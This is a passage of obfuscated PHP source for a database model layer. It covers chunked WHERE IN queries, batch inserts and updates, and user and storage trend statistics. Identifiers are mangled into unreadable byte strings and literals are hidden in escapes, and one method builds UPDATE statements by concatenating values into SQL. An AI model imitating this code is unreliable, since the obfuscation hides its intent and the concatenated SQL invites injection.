$Ç²åÃº¢; } $©°–Äöë[] = $ôÓƒ”×â[118] . $¿–”‹àÊ[1] . $ôÓƒ”×â[118]; $ ØêÂ++; $æéŠç®‡ .= "\40\127\110\105\x4e\40\47{$¿–”‹àÊ[1]}\x27\40\x54\110\105\x4e\40\x27{$¿–”‹àÊ[3]}\47\x20\xa"; if ($ ØêÂ == $¥­÷ÆÑÃ || $÷Ô¯³ò == $Ó€Ôòş - 1) { $û’åÜÆ¤ = implode($ôÓƒ”×â[50], $©°–Äöë); $æéŠç®‡ .= "\x20\105\116\104\x20\x20\x57\x48\105\122\x45\40{$¿–”‹àÊ[0]}\x20\x49\116\x20\50{$û’åÜÆ¤}\51\40"; $this->execute($æéŠç®‡); $ ØêÂ = 0; $æéŠç®‡ = $Ç²åÃº¢; $this->chunkEventCheck(count($©°–Äöë)); $©°–Äöë = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ÿ”ğşê) { $÷ì»ı¼ =& $_SERVER[Ü©»’·]; $»¸ˆ ç¿ = $this->tablePrefix . $this->tableName; foreach ($Ÿ”ğşê as $«äÑÖÍ›) { if (!is_array($«äÑÖÍ›) || count($«äÑÖÍ›) != 4) { continue; } $¯Ó²˜­ = $«äÑÖÍ›[0] . $÷ì»ı¼[388] . $«äÑÖÍ›[1] . $÷ì»ı¼[118]; $ÓØÅÔ¡« = $«äÑÖÍ›[2] . $÷ì»ı¼[388] . $«äÑÖÍ›[3] . $÷ì»ı¼[118]; $Ï‹Ñ¿ÎÕ = "\165\x70\144\x61\164\x65\40{$»¸ˆ ç¿}\x20\163\x65\x74\40{$ÓØÅÔ¡«}\x20\x77\150\x65\162\145\40{$¯Ó²˜­}\73"; $this->execute($Ï‹Ñ¿ÎÕ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($§§ª×á… = false, $’ºˆ€’ = false) { $this->_chunkEvent = $§§ª×á…; $this->_chunkEventParam = $’ºˆ€’; } private function chunkEventCheck($ÆåÊ¾Ö) { if (!$this->_chunkEvent) { return; } $‡«­‚å = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‡«­‚å[$_SERVER[Ü©»’·][389]] = $ÆåÊ¾Ö; Hook::trigger($this->_chunkEvent, $‡«­‚å); } public function addAll($ÄÇíå’÷, $¨ÎÉüù  = array(), $æşö³àò = false) { $øµÛíÌŞ =& $_SERVER[Ü©»’·]; ignore_timeout(); $æÉ÷ë§’ = self::SQL_WHERE_IN_CHUNK; if (empty($ÄÇíå’÷)) { $this->error = think_lang($øµÛíÌŞ[271]); return !1; } $¨ÎÉüù  = $this->_parseOptions($¨ÎÉüù ); foreach ($ÄÇíå’÷ as $œ’éçÆì => $”ş“ªÆß) { $ÄÇíå’÷[$œ’éçÆì] = $this->_facade($”ş“ªÆß); $this->_beforeInsert($ÄÇíå’÷[$œ’éçÆì], $¨ÎÉüù ); } if (method_exists($this->db, $øµÛíÌŞ[272])) { for ($”Ùİå˜ç = 0; $”Ùİå˜ç < count($ÄÇíå’÷); $”Ùİå˜ç += $æÉ÷ë§’) { $™Ãˆˆ§ = array_slice($ÄÇíå’÷, $”Ùİå˜ç, $æÉ÷ë§’); if (!is_array($™Ãˆˆ§) || count($™Ãˆˆ§) == 0) { break; } $±–ö¢ıò = $this->db->insertAll($™Ãˆˆ§, $¨ÎÉüù , $æşö³àò); $this->chunkEventCheck(count($™Ãˆˆ§)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÄÇíå’÷ as $œ’éçÆì => $”ş“ªÆß) { $±–ö¢ıò = $this->db->insert($”ş“ªÆß, $¨ÎÉüù , $æşö³àò); } $this->commit(); } if (!1 !== $±–ö¢ıò) { $¯ğÈ½ÇË = $this->getLastInsID(); if ($¯ğÈ½ÇË) { return $¯ğÈ½ÇË; } } return $±–ö¢ıò; } public function save($·–È˜ü« = '', $ÁùØ»á = array()) { $Øš×Ìéà =& $_SERVER[Ü©»’·]; $œ˜¬é™ = self::SQL_WHERE_IN_CHUNK; $î¤Àƒ­ = $this->optionsValue(); $ºÈÁ”×â = $this->findWhereField($î¤Àƒ­); if (!$ºÈÁ”×â) { return parent::save($·–È˜ü«, $ÁùØ»á); } $ª¾ô«†Ğ = 0; $ÊÅâ¥§¶ = $î¤Àƒ­[$Øš×Ìéà[275]][$ºÈÁ”×â][1]; $ÊÅâ¥§¶ = is_array($ÊÅâ¥§¶) ? $ÊÅâ¥§¶ : array(); $øù¿ÁŒÎ = count($ÊÅâ¥§¶); for ($ÙÒâˆç” = 0; $ÙÒâˆç” < $øù¿ÁŒÎ; $ÙÒâˆç” += $œ˜¬é™) { $‡èÍ“®í = array_slice($ÊÅâ¥§¶, $ÙÒâˆç”, $œ˜¬é™); if (!is_array($‡èÍ“®í) || count($‡èÍ“®í) == 0) { break; } $î¤Àƒ­[$Øš×Ìéà[275]][$ºÈÁ”×â][1] = $‡èÍ“®í; $this->optionsValue($î¤Àƒ­); $ª¾ô«†Ğ += parent::save($·–È˜ü«, $ÁùØ»á); $this->chunkEventCheck(count($‡èÍ“®í)); } $this->chunkEventSet(); return $ª¾ô«†Ğ; } public function add($œ¾±„°ø = '', $¨Õ±õ÷ = array(), $¡Íõ”¬ì = false) { if ($this->addTaskStatus && is_array($œ¾±„°ø)) { $this->addTaskData[] = $œ¾±„°ø; return; } return parent::add($œ¾±„°ø, $¨Õ±õ÷, $¡Íõ”¬ì); } public function parseWhereLike($ÄƒÔà™±, $Éà” = '', $ˆşû–œÍ = false, &$û‡­ˆ¨ = false) { $İäÑÑíê =& $_SERVER[Ü©»’·]; $îÙÚ İª = $GLOBALS[$İäÑÑíê[6]][$İäÑÑíê[390]]; if (!$îÙÚ İª[$İäÑÑíê[391]]) { return $ÄƒÔà™±; } if (!is_array($ÄƒÔà™±)) { return $ÄƒÔà™±; } $ö×á¯šÆ = array(); $îÆÜ‚•û = 0; foreach ($ÄƒÔà™± as $³üèÖò˜ => $Éäêó™¿) { if (is_array($Éäêó™¿) && count($Éäêó™¿) == 2 && $Éäêó™¿[0] == $İäÑÑíê[392] && is_string($Éäêó™¿[1]) && substr($Éäêó™¿[1], 0, 1) == $İäÑÑíê[393] && substr($Éäêó™¿[1], strlen($Éäêó™¿[1]) - 1, 1) == $İäÑÑíê[393]) { $û‡­ˆ¨ = !0; $ºÂ˜ô¦  = is_string($³üèÖò˜) ? $³üèÖò˜ : $Éà”; $Š£¯âË = substr($Éäêó™¿[1], 1, strlen($Éäêó™¿[1]) - 2); $Š£¯âË = $this->db->escapeString($Š£¯âË); if (!strpos($ºÂ˜ô¦ , $İäÑÑíê[10])) { $ºÂ˜ô¦  = $İäÑÑíê[394] . $ºÂ˜ô¦  . $İäÑÑíê[394]; } $ãüÑş… = $İäÑÑíê[188] . $Š£¯âË . $İäÑÑíê[188]; $Š£¯âË = str_replace(array($İäÑÑíê[10], $İäÑÑíê[395], $İäÑÑíê[11]), $İäÑÑíê[396], $Š£¯âË); if ($îÙÚ İª[$İäÑÑíê[397]]) { $ãüÑş… = $İäÑÑíê[398] . $Š£¯âË . $İäÑÑíê[399]; if ($îÙÚ İª[$İäÑÑíê[400]]) { $ãüÑş… = $İäÑÑíê[399] . $Š£¯âË . $İäÑÑíê[398]; } } $ö×á¯šÆ[$îÆÜ‚•û] = $İäÑÑíê[401] . $ºÂ˜ô¦  . $İäÑÑíê[402] . $ãüÑş… . $İäÑÑíê[403]; $îÆÜ‚•û++; continue; } if (is_array($Éäêó™¿)) { $Éà” = is_string($³üèÖò˜) ? $³üèÖò˜ : $Éà”; $Éäêó™¿ = $this->parseWhereLike($Éäêó™¿, $Éà”, !0, $û‡­ˆ¨); } if (is_numeric($³üèÖò˜)) { $ö×á¯šÆ[$îÆÜ‚•û] = $Éäêó™¿; $îÆÜ‚•û++; } else { $ö×á¯šÆ[$³üèÖò˜] = $Éäêó™¿; } } if ($û‡­ˆ¨ && !$ˆşû–œÍ) { } return $ö×á¯šÆ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($»äÑ‰Ô = array()) { $‘ÑÁÇíŒ =& $_SERVER[Ü©»’·]; $§ˆó€Èˆ = self::SQL_WHERE_IN_CHUNK; $„ÅŞãÀà = $this->optionsValue(); $Ç¦ÎÈ¹½ = $this->findWhereField($„ÅŞãÀà); if (!$Ç¦ÎÈ¹½ || isset($„ÅŞãÀà[$‘ÑÁÇíŒ[292]]) || isset($„ÅŞãÀà[$‘ÑÁÇíŒ[353]])) { return parent::select($»äÑ‰Ô); } $–™ì»ˆˆ = $„ÅŞãÀà[$‘ÑÁÇíŒ[275]][$Ç¦ÎÈ¹½][1]; $–™ì»ˆˆ = is_array($–™ì»ˆˆ) ? $–™ì»ˆˆ : array(); $¥ä‡¾÷æ = null; for ($‰¨ùëè¢ = 0; $‰¨ùëè¢ < count($–™ì»ˆˆ); $‰¨ùëè¢ += $§ˆó€Èˆ) { $â­äû³è = array_slice($–™ì»ˆˆ, $‰¨ùëè¢, $§ˆó€Èˆ); if (!is_array($â­äû³è) || count($â­äû³è) == 0) { break; } $„ÅŞãÀà[$‘ÑÁÇíŒ[275]][$Ç¦ÎÈ¹½][1] = $â­äû³è; $this->optionsValue($„ÅŞãÀà); $¬œ¤ˆÆ¡ = parent::select($»äÑ‰Ô); if (!$¬œ¤ˆÆ¡) { continue; } $¥ä‡¾÷æ = is_array($¥ä‡¾÷æ) ? $¥ä‡¾÷æ : array(); $¥ä‡¾÷æ = array_merge($¥ä‡¾÷æ, $¬œ¤ˆÆ¡); } return $¥ä‡¾÷æ; } public function delete($»Äûî = array()) { $îñøÑî =& $_SERVER[Ü©»’·]; $ùÅ–ù€Ğ = self::SQL_WHERE_IN_CHUNK; $ŒïÜ’§¸ = $this->optionsValue(); $Ïä°ò¿¿ = $this->findWhereField($ŒïÜ’§¸); if (!$Ïä°ò¿¿) { return parent::delete($»Äûî); } $ˆ³¯ú–Ğ = 0; $°ƒÑÌ = $ŒïÜ’§¸[$îñøÑî[275]][$Ïä°ò¿¿][1]; $°ƒÑÌ = is_array($°ƒÑÌ) ? $°ƒÑÌ : array(); for ($¢ß ÍÈÍ = 0; $¢ß ÍÈÍ < count($°ƒÑÌ); $¢ß ÍÈÍ += $ùÅ–ù€Ğ) { $Íûİö¾ƒ = array_slice($°ƒÑÌ, $¢ß ÍÈÍ, $ùÅ–ù€Ğ); if (!is_array($Íûİö¾ƒ) || count($Íûİö¾ƒ) == 0) { break; } $ŒïÜ’§¸[$îñøÑî[275]][$Ïä°ò¿¿][1] = $Íûİö¾ƒ; $this->optionsValue($ŒïÜ’§¸); $ˆ³¯ú–Ğ += parent::delete($»Äûî); } return $ˆ³¯ú–Ğ; } private function findWhereField($Ñ©éş¡) { $˜‹Şß‡ =& $_SERVER[Ü©»’·]; $èĞ¼ÁÕĞ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ñ©éş¡) || !is_array($Ñ©éş¡[$˜‹Şß‡[275]])) { return !1; } foreach ($Ñ©éş¡[$˜‹Şß‡[275]] as $³õıâß => $ËãÉ·İ®) { if (is_array($ËãÉ·İ®) && isset($ËãÉ·İ®[0]) && is_string($ËãÉ·İ®[0]) && strtolower($ËãÉ·İ®[0]) == $˜‹Şß‡[7] && is_array($ËãÉ·İ®[1]) && count($ËãÉ·İ®[1]) > $èĞ¼ÁÕĞ) { ignore_timeout(); return $³õıâß; } } return !1; } public function setMasterDB($–©ğóê‚ = true) { think_config($_SERVER[Ü©»’·][404], $–©ğóê‚); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\155\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($³Ü·£­Ò = false, $¸‰¾ª›Ê = "\155\157\x64\151\x66\171\x54\151\155\x65", $ÄÅ½¤™ = false) { $«”˜×Úˆ = Model($this->modelType)->get(!1, $this->optionType, !0); $¨½¶ÙŠê = array_values($«”˜×Úˆ); if ($¨½¶ÙŠê && $¨½¶ÙŠê[0] && !is_array($¨½¶ÙŠê[0])) { Model($this->modelType)->cacheRemove($this->optionType); $«”˜×Úˆ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$«”˜×Úˆ) { return $³Ü·£­Ò ? null : array(); } if (!$³Ü·£­Ò) { $«”˜×Úˆ = array_filter(array_values($«”˜×Úˆ)); return array_sort_by($«”˜×Úˆ, $¸‰¾ª›Ê, $ÄÅ½¤™); } return $«”˜×Úˆ[$_SERVER[Ü©»’·][405] . $³Ü·£­Ò]; } public function insert($äæÓ²Â†) { $ÖÄ†óÀÖ =& $_SERVER[Ü©»’·]; $äæÓ²Â† = array_field_key($äæÓ²Â†, $this->field); $êÛôóÔû = Model($this->modelType)->get($ÖÄ†óÀÖ[406], $this->optionType . $ÖÄ†óÀÖ[407]); $êÛôóÔû = $êÛôóÔû ? $êÛôóÔû : 0; $äæÓ²Â†[$ÖÄ†óÀÖ[408]] = ++$êÛôóÔû; $äæÓ²Â†[$ÖÄ†óÀÖ[200]] = time(); $äæÓ²Â†[$ÖÄ†óÀÖ[85]] = time(); Model($this->modelType)->set($ÖÄ†óÀÖ[406], $êÛôóÔû, $this->optionType . $ÖÄ†óÀÖ[407]); Model($this->modelType)->set($ÖÄ†óÀÖ[405] . $êÛôóÔû, $äæÓ²Â†, $this->optionType); return $êÛôóÔû; } public function update($Ôç¸´°Â, $ê•íÓô¢) { $‚ñâ»×£ =& $_SERVER[Ü©»’·]; $ê•íÓô¢ = array_field_key($ê•íÓô¢, $this->field); $¤ÏòÊøî = $this->listData($Ôç¸´°Â); if (!$¤ÏòÊøî || !$Ôç¸´°Â) { return !1; } $ê•íÓô¢ = array_merge($¤ÏòÊøî, $ê•íÓô¢); $ê•íÓô¢[$‚ñâ»×£[85]] = time(); return Model($this->modelType)->set($‚ñâ»×£[405] . $Ôç¸´°Â, $ê•íÓô¢, $this->optionType); } public function remove($î•æÃö¤) { if (!$î•æÃö¤) { return !1; } return Model($this->modelType)->remove($_SERVER[Ü©»’·][405] . $î•æÃö¤, $this->optionType); } public function clear() { $Ø¬Ÿï³Ô =& $_SERVER[Ü©»’·]; Model($this->modelType)->remove($Ø¬Ÿï³Ô[406], $this->optionType . $Ø¬Ÿï³Ô[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($µ ŞÆò, $Š±¤å­ü) { if (!$Š±¤å­ü) { return !1; } $ëµ°íç« = $this->listData(); $ëµ°íç« = array_to_keyvalue($ëµ°íç«, $µ ŞÆò); return isset($ëµ°íç«[$Š±¤å­ü]) ? $ëµ°íç«[$Š±¤å­ü] : !1; } public function findByName($£à”Íµ´) { return $this->findByKey($_SERVER[Ü©»’·][32], $£à”Íµ´); } protected function resetData($¢¥Ù‹å¥) { $Í¹Şä±ô =& $_SERVER[Ü©»’·]; $¢¥Ù‹å¥ = is_array($¢¥Ù‹å¥) ? $¢¥Ù‹å¥ : array(); $ë¨ıÜ“ = array(); for ($ õƒÃ¡™ = 0; $ õƒÃ¡™ < count($¢¥Ù‹å¥); $ õƒÃ¡™++) { $ë¨ıÜ“[$Í¹Şä±ô[405] . $¢¥Ù‹å¥[$ õƒÃ¡™][$Í¹Şä±ô[408]]] = $¢¥Ù‹å¥[$ õƒÃ¡™]; } return Model($this->modelType)->set($ë¨ıÜ“, !1, $this->optionType); } private function getAutoName($€ºú¤¹Ç) { $ùëÂÊç = array_to_keyvalue($this->listData(), $_SERVER[Ü©»’·][32]); if (!$ùëÂÊç || !isset($ùëÂÊç[$€ºú¤¹Ç])) { return $€ºú¤¹Ç; } for ($ëêÍÅë‡ = 1; $ëêÍÅë‡ < count($ùëÂÊç); $ëêÍÅë‡++) { $˜®ˆ¿éğ = $€ºú¤¹Ç . "\50{$ëêÍÅë‡}\x29"; if (!isset($ùëÂÊç[$˜®ˆ¿éğ])) { return $˜®ˆ¿éğ; } } return $˜®ˆ¿éğ; } } goto Bƒ÷ÚöÔÃ•; E®­×ãß”Æ: class AnalysisModel extends ModelBaseLight { public function init($¥­›°ƒÛ) { $³‘¶ı˜Š =& $_SERVER[Ü©»’·]; $êî€ìÏÓ = array($³‘¶ı˜Š[609] => array($³‘¶ı˜Š[33] => $³‘¶ı˜Š[1787], $³‘¶ı˜Š[273] => array($³‘¶ı˜Š[224], $³‘¶ı˜Š[771], $³‘¶ı˜Š[1788], $³‘¶ı˜Š[1789])), $³‘¶ı˜Š[1790] => array($³‘¶ı˜Š[33] => $³‘¶ı˜Š[1791], $³‘¶ı˜Š[273] => array($³‘¶ı˜Š[224], $³‘¶ı˜Š[769], $³‘¶ı˜Š[1792], $³‘¶ı˜Š[1793], $³‘¶ı˜Š[1794]))); if (!isset($êî€ìÏÓ[$¥­›°ƒÛ])) { return !1; } $this->optionType = $êî€ìÏÓ[$¥­›°ƒÛ][$³‘¶ı˜Š[33]]; $this->field = $êî€ìÏÓ[$¥­›°ƒÛ][$³‘¶ı˜Š[273]]; return !0; } public function listData($ğÙŸ¼¿¬ = false, $¤Ô¨°¿ = "\x6d\157\144\151\x66\171\x54\x69\x6d\145", $£Û×ä£… = false) { return parent::listData($ğÙŸ¼¿¬, $¤Ô¨°¿, $£Û×ä£…); } public function trendList($Ş½Ñéñ) { $ÂÙ†ğ—¼ =& $_SERVER[Ü©»’·]; $×¾¯óıˆ = $this->listData(); if ($×¾¯óıˆ) { $şÇË¾È = end($×¾¯óıˆ); $ºËÏ¤¶­ = date($ÂÙ†ğ—¼[1795], strtotime($ÂÙ†ğ—¼[1796])); if ($şÇË¾È[$ÂÙ†ğ—¼[224]] == $ºËÏ¤¶­) { return $×¾¯óıˆ; } $½œ™áĞÒ = strtotime($şÇË¾È[$ÂÙ†ğ—¼[224]]); } if (!isset($½œ™áĞÒ)) { $€òÂœÅã = $Ş½Ñéñ == $ÂÙ†ğ—¼[609] ? $ÂÙ†ğ—¼[544] : $ÂÙ†ğ—¼[831]; $½œ™áĞÒ = Model($€òÂœÅã)->min($ÂÙ†ğ—¼[200]); } $ßÉé¹ˆÏ = $ÂÙ†ğ—¼[1797] . ucfirst($Ş½Ñéñ); $–¶„ó—‡ = $this->dateList($½œ™áĞÒ); foreach ($–¶„ó—‡ as $ºËÏ¤¶­) { $this->{$ßÉé¹ˆÏ}($ºËÏ¤¶­); } return $this->listData(); } private function dateList($Á¤õ„Ô) { $¾Ë…È®° =& $_SERVER[Ü©»’·]; $ãõêªØœ = $Á¤õ„Ô; $ö·Ã’±é = strtotime($¾Ë…È®°[1796]); $üÃš·¥¿ = array(); while ($ãõêªØœ <= $ö·Ã’±é) { $üÃš·¥¿[] = date($¾Ë…È®°[1795], $ãõêªØœ); $ãõêªØœ = strtotime($¾Ë…È®°[1798], $ãõêªØœ); } return $üÃš·¥¿; } public function _recordUser($ÚÙĞ¾Ñ = '') { $ê«»µ¶Â =& $_SERVER[Ü©»’·]; $¶„çÇê´ = strtotime(date($ê«»µ¶Â[1799], strtotime($ÚÙĞ¾Ñ))); $¾¢İâ¶Õ = strtotime(date($ê«»µ¶Â[1800], strtotime($ÚÙĞ¾Ñ))); $üò‹´ô› = array($ê«»µ¶Â[200] => array($ê«»µ¶Â[1016], $¾¢İâ¶Õ)); $ïñ÷üªİ = Model($ê«»µ¶Â[544])->where($üò‹´ô›)->count($ê«»µ¶Â[1669]); $üò‹´ô›[$ê«»µ¶Â[200]] = array($ê«»µ¶Â[333], array($¶„çÇê´, $¾¢İâ¶Õ)); $¥„’Åê = Model($ê«»µ¶Â[544])->where($üò‹´ô›)->count($ê«»µ¶Â[1669]); $üò‹´ô›[$ê«»µ¶Â[33]] = $ê«»µ¶Â[1801]; $Õ°×¿§³ = Model($ê«»µ¶Â[1802])->where($üò‹´ô›)->count($ê«»µ¶Â[1803]); $Ã‹Ûã = array($ê«»µ¶Â[224] => $ÚÙĞ¾Ñ, $ê«»µ¶Â[771] => (int) $ïñ÷üªİ, $ê«»µ¶Â[1788] => (int) $¥„’Åê, $ê«»µ¶Â[1789] => (int) $Õ°×¿§³); return $this->insert($Ã‹Ûã); } public function _recordStore($×Ã¥£íò = '') { $Íí§š¶Ç =& $_SERVER[Ü©»’·]; $æ‡ôúà¾ = strtotime(date($Íí§š¶Ç[1800], strtotime($×Ã¥£íò))); $¦Ş úÚ¥ = array($Íí§š¶Ç[200] => array($Íí§š¶Ç[1016], $æ‡ôúà¾)); $¨Øæâü¬ = Model($Íí§š¶Ç[480])->where($¦Ş úÚ¥)->sum($Íí§š¶Ç[76]); $¦Ş úÚ¥[$Íí§š¶Ç[419]] = 0; $ù¿¶ÓÅã = Model($Íí§š¶Ç[831])->where($¦Ş úÚ¥)->sum($Íí§š¶Ç[76]); $¦Ş úÚ¥[$Íí§š¶Ç[420]] = 1; $İí‹¿± = Model($Íí§š¶Ç[831])->where($¦Ş úÚ¥)->sum($Íí§š¶Ç[76]); $¦Ş úÚ¥[$Íí§š¶Ç[420]] = 2; $öÕÌ†şñ = Model($Íí§š¶Ç[831])->where($¦Ş úÚ¥)->sum($Íí§š¶Ç[76]); $ö×ÌÎŞƒ = array($Íí§š¶Ç[224] => $×Ã¥£íò, $Íí§š¶Ç[769] => (int) $ù¿¶ÓÅã, $Íí§š¶Ç[1792] => (int) $¨Øæâü¬, $Íí§š¶Ç[1793] => (int) $İí‹¿±, $Íí§š¶Ç[1794] => (int) $öÕÌ†şñ); return $this->insert($ö×ÌÎŞƒ); } public function trend($¦§€Ï, $Ö’é…•) { $áğÈ«ƒá =& $_SERVER[Ü©»’·]; if (!$this->init($¦§€Ï)) { return !1; } $Ì¤­Å… = $this->trendList($¦§€Ï); if ($Ì¤­Å… && $Ö’é…• != $áğÈ«ƒá[1642]) { $­á«—‚Ä = $Ì¤­Å…[0][$áğÈ«ƒá[224]]; $‡¹¬òğ¿ = $this->validDate($Ö’é…•, $­á«—‚Ä); $€õ«• § = array(); $´ÁÀŒò´ = array_to_keyvalue($Ì¤­Å…, $áğÈ«ƒá[224]); foreach ($‡¹¬òğ¿ as $ö”ëÄÂ) { if (isset($´ÁÀŒò´[$ö”ëÄÂ])) { $€¿¢Á‚ó = $´ÁÀŒò´[$ö”ëÄÂ]; } else { $€¿¢Á‚ó = end($Ì¤­Å…); $€¿¢Á‚ó[$áğÈ«ƒá[224]] = $ö”ëÄÂ; if ($¦§€Ï == $áğÈ«ƒá[609]) { $€¿¢Á‚ó[$áğÈ«ƒá[1788]] = $€¿¢Á‚ó[$áğÈ«ƒá[1789]] = 0; } } $€õ«• §[] = $€¿¢Á‚ó; } $Ì¤­Å… = $€õ«• §; } $ê‰’Êè³ = array($áğÈ«ƒá[609] => array($áğÈ«ƒá[771] => LNG($áğÈ«ƒá[1804]), $áğÈ«ƒá[1788] => LNG($áğÈ«ƒá[1805]), $áğÈ«ƒá[1789] => LNG($áğÈ«ƒá[1806])), $áğÈ«ƒá[1790] => array($áğÈ«ƒá[769] => LNG($áğÈ«ƒá[1807]), $áğÈ«ƒá[1792] => LNG($áğÈ«ƒá[1808]), $áğÈ«ƒá[1793] => LNG($áğÈ«ƒá[1809]), $áğÈ«ƒá[1794] => LNG($áğÈ«ƒá[1810]))); $å«ş—ğ = array($áğÈ«ƒá[609] => $áğÈ«ƒá[1811], $áğÈ«ƒá[1790] => $áğÈ«ƒá[76]); if (empty($Ì¤­Å…)) { $ö”ëÄÂ = date($áğÈ«ƒá[1795], strtotime($áğÈ«ƒá[1796])); $Á¸ğĞÛŠ = array($áğÈ«ƒá[224] => $ö”ëÄÂ); foreach ($ê‰’Êè³[$¦§€Ï] as $Íù¹«Î– => $ Òä–ÍÜ) { $Á¸ğĞÛŠ[$Íù¹«Î–] = 0; } $Ì¤­Å…[] = $Á¸ğĞÛŠ; } $£Ç¿öú” = array(); foreach ($Ì¤­Å… as $ Òä–ÍÜ) { if ($¦§€Ï == $áğÈ«ƒá[1790] && $ Òä–ÍÜ[$áğÈ«ƒá[1792]] > $ Òä–ÍÜ[$áğÈ«ƒá[769]]) { $ Òä–ÍÜ[$áğÈ«ƒá[1792]] = $ Òä–ÍÜ[$áğÈ«ƒá[769]]; } foreach ($ê‰’Êè³[$¦§€Ï] as $Íù¹«Î– => $»Ê©£¡°) { $€¿¢Á‚ó = array($áğÈ«ƒá[224] => $ Òä–ÍÜ[$áğÈ«ƒá[224]], $áğÈ«ƒá[1567] => $»Ê©£¡°); $€¿¢Á‚ó[$å«ş—ğ[$¦§€Ï]] = isset($ Òä–ÍÜ[$Íù¹«Î–]) ? $ Òä–ÍÜ[$Íù¹«Î–] : 0; $£Ç¿öú”[] = $€¿¢Á‚ó; } } return $£Ç¿öú”; } public function validDate($Ö…Ì²ë, $¬ã»Ó¹) { $†çœşÔÆ =& $_SERVER[Ü©»’·]; $Ÿ™‚®¶ = date($†çœşÔÆ[1795], strtotime($†çœşÔÆ[1796])); $¤ù­»½œ = array($Ÿ™‚®¶); switch ($Ö…Ì²ë) { case $†çœşÔÆ[1649]: $¯ÕØã¶ç = mktime(0, 0, 0, date($†çœşÔÆ[1812]), date($†çœşÔÆ[1387]) - date($†çœşÔÆ[1450]) + 7 - 7, date($†çœşÔÆ[1813])); $´ŠŠ—„è = 0; do { $ª¦ßí†ó = date($†çœşÔÆ[1795], $¯ÕØã¶ç - 3600 * 24 * 7 * $´ŠŠ—„è); $¤ù­»½œ[] = $ª¦ßí†ó; $´ŠŠ—„è++; } while ($¬ã»Ó¹ < $ª¦ßí†ó); break; case $†çœşÔÆ[1647]: $´ŠŠ—„è = 1; do { $óŒéû­‚ = date($†çœşÔÆ[1814], strtotime("\55\x20{$´ŠŠ—„è}\x20\155\x6f\156\164\x68\163")); $¤ù­»½œ[] = $óŒéû­‚; $´ŠŠ—„è++; } while ($¬ã»Ó¹ < $óŒéû­‚); break; case $†çœşÔÆ[1815]: $Ï¾ÉËÅå = (int) date($†çœşÔÆ[1813], strtotime($¬ã»Ó¹)); $ÕƒËĞ¦Â = (int) date($†çœşÔÆ[1813]); if ($Ï¾ÉËÅå >= $ÕƒËĞ¦Â) { break; } for ($Ï¾ÉËÅå; $Ï¾ÉËÅå < $ÕƒËĞ¦Â; $Ï¾ÉËÅå++) { $¤ù­»½œ[] = $Ï¾ÉËÅå . $†çœşÔÆ[1816]; } break; default: break; } if ($¬ã»Ó¹ > end($¤ù­»½œ)) { array_pop($¤ù­»½œ); } sort($¤ù­»½œ); return $¤ù­»½œ; } public function listTable($®‚ŠÒ‚Õ) { $§íŸ””È = ucfirst($®‚ŠÒ‚Õ); return Model($§íŸ””È)->listData(); } public function option($à…‹Àê–) { $ÂıÀèª¦ = $_SERVER[Ü©»’·][1817] . ucfirst($à…‹Àê–); return $this->{$ÂıÀèª¦}(); } private function optionUser() { $µº®óŞ¥ =& $_SERVER[Ü©»’·]; $˜˜‰üá = Model($µº®óŞ¥[544])->count($µº®óŞ¥[1669]); $ş§°ª¼µ = Model($µº®óŞ¥[544])->where($µº®óŞ¥[1818])->count($µº®óŞ¥[1669]); $ŞÌîô¡ = intval($GLOBALS[$µº®óŞ¥[6]][$µº®óŞ¥[349]][$µº®óŞ¥[1624]]) / 3600; $–¸‹–ñ© = strtotime("\x2d{$ŞÌîô¡}\x20\x68\x6f\x75\162\163"); $š±••¿ò = strtotime(date($µº®óŞ¥[1799])); if ($–¸‹–ñ© < $š±••¿ò) { $–¸‹–ñ© = $š±••¿ò; } $Úô˜ø©ˆ = array($µº®óŞ¥[1819] => array($µº®óŞ¥[1017], $–¸‹–ñ©)); $Ö¶„Šéå = (int) Model($µº®óŞ¥[544])->where($Úô˜ø©ˆ)->count($µº®óŞ¥[1669]); if (!$Ö¶„Šéå) { $Ö¶„Šéå = 1; } $Úô˜ø©ˆ = array($µº®óŞ¥[1819] => array($µº®óŞ¥[1017], $š±••¿ò)); $­†±Ğ²È = Model($µº®óŞ¥[544])->where($Úô˜ø©ˆ)->count($µº®óŞ¥[1669]); return array($µº®óŞ¥[765] => (int) $˜˜‰üá, $µº®óŞ¥[1820] => (int) ($˜˜‰üá - $ş§°ª¼µ), $µº®óŞ¥[1821] => (int) $ş§°ª¼µ, $µº®óŞ¥[1822] => (int) $­†±Ğ²È, $µº®óŞ¥[1823] => $Ö¶„Šéå); } private function optionFile() { $ëåÀ©  =& $_SERVER[Ü©»’·]; $¼àŞ½ÉÎ = $this->sourceSize(); $¨òñŠÆ£ = $¼àŞ½ÉÎ[$ëåÀ© [76]]; $®óƒ›Î˜ = $¼àŞ½ÉÎ[$ëåÀ© [1792]]; $¯’î§Áö = Model($ëåÀ© [831])->where(array($ëåÀ© [419] => 0))->count($ëåÀ© [411]); $íì¬ôçè = array($ëåÀ© [419] => 0, $ëåÀ© [200] => array($ëåÀ© [1017], strtotime(date($ëåÀ© [1799])))); $·‡âóæ¡ = Model($ëåÀ© [831])->where($íì¬ôçè)->sum($ëåÀ© [76]); $á…–İ—ı = Model($ëåÀ© [831])->where($íì¬ôçè)->count($ëåÀ© [411]); return array($ëåÀ© [769] => $¨òñŠÆ£, $ëåÀ© [1792] => $®óƒ›Î˜, $ëåÀ© [1824] => $¨òñŠÆ£ - $®óƒ›Î˜, $ëåÀ© [1825] => (int) $·‡âóæ¡, $ëåÀ© [771] => (int) $¯’î§Áö, $ëåÀ© [1826] => (int) $á…–İ—ı); } private function optionAccess() { $Õ´ƒ¨ë£ =& $_SERVER[Ü©»’·]; return array($Õ´ƒ¨ë£[765] => $this->typeLogCnt(), $Õ´ƒ¨ë£[107] => $this->typeLogCnt($Õ´ƒ¨ë£[107]), 